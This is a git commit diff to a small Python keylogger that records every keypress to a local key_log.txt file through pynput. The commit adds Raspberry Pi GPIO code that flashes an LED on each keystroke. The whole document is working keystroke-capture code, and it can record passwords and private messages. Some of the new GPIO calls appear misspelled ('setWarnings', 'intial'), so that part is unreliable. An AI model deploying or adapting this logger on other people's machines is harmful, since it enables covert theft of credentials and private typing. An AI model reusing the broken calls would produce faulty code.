59efdedb0eb7d092f3936d45301d6eb15c661826
Prakash King <32677400+iamprakash13@users.noreply.github.com>
2019-08-27 20:39:39 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,26 @@
 from pynput.keyboard import Key, Listener
+import RPi.GPIO as GPIO
 import logging
+from time import sleep
 
-log_dir = "" #choose current directory
+# setting gpio pin for led
+GPIO.setWarnings(False)
+GPIO.setmode(GPIO.BOARD)
+GPIO.setup(8, GPIO.OUT, intial=GPIO.LOW)
+
+#current directory
+log_dir = ""
 
 #creating new file and setting format of everyline to be printed
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
+#add logging information before key value
 def on_press(key):
-    logging.info(str(key)) #add logging information before key value
+    logging.info(str(key))
+    GPIO.output(8, GPIO.HIGH)
+    sleep(0.05)
+    GPIO.output(8, GPIO.LOW)
 
-with Listener(on_press=on_press) as listener: #collect keys on pressed in keyboard
+#collect keys on pressed in keyboard
+with Listener(on_press=on_press) as listener: 
     listener.join()
